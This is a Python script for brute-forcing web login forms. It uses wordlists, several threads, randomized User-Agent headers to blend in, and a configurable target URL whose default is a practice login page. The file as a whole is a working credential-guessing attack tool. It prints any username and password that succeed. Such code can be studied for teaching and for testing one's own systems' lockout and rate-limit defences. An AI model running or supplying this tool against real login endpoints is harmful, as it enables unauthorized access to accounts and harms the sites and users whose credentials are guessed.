import requests
import argparse
import pyfiglet
import time
import threading
import queue
import os
import sys
import random

asciiBanner = pyfiglet.figlet_format("Web Login Brute Force")
print(asciiBanner)

parser = argparse.ArgumentParser(description="Enhanced Web Login brute force tool")
parser.add_argument('-u', '--url', help='URL to brute force', default='https://practicetestautomation.com/practice-test-login/', required=True)
parser.add_argument('--user', help='Usernames wordlist file', default='.\\username.txt', required=True)
parser.add_argument('--password', help='Passwords wordlist file', default='.\\password.txt', required=True)
parser.add_argument('--threads', help='Number of concurrent threads', default=5, type=int)
parser.add_argument('--delay', help='Delay between requests (seconds)', default=1, type=float)
parser.add_argument('--verbose', help='Verbose output', action='store_true')
args = parser.parse_args()

url = args.url
user_file = args.user
password_file = args.password
num_threads = args.threads
delay = args.delay
verbose = args.verbose

if not os.path.isfile(user_file) or not os.path.isfile(password_file):
    print("Error: Wordlist files not found.")
    sys.exit(1)

usernames = []
passwords = []
with open(user_file) as f:
    usernames = [line.strip() for line in f if line.strip()]
with open(password_file) as f:
    passwords = [line.strip() for line in f if line.strip()]

task_queue = queue.Queue()

for user in usernames:
    for pwd in passwords:
        task_queue.put((user, pwd))

# Flag to stop threading when a correct credential is found
found_flag = threading.Event()

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/112.0',
]

def worker():
    session = requests.Session()
    while not task_queue.empty() and not found_flag.is_set():
        try:
            username, password = task_queue.get_nowait()
        except queue.Empty:
            return
        headers = {
            'User-Agent': random.choice(user_agents),
        }
        data = {'username': username, 'password': password, 'Login': 'submit'}
        try:
            response = session.post(url, data=data, headers=headers, timeout=10)
            # Check the success condition
            if "logged-in-successfully" in response.url:
                print(f"[SUCCESS] Username: {username} Password: {password}")
                found_flag.set()
                break
            else:
                if verbose:
                    print(f"[FAILURE] Username: {username} Password: {password}")
        except requests.RequestException as e:
            if verbose:
                print(f"[ERROR] Request error for {username}:{password} -> {e}")
        time.sleep(delay)
        task_queue.task_done()

threads = []

print(f"Starting brute force with {num_threads} threads...")

for _ in range(num_threads):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()

if not found_flag.is_set():
    print("Completed! No valid credentials found.")
else:
    print("Successful login!")
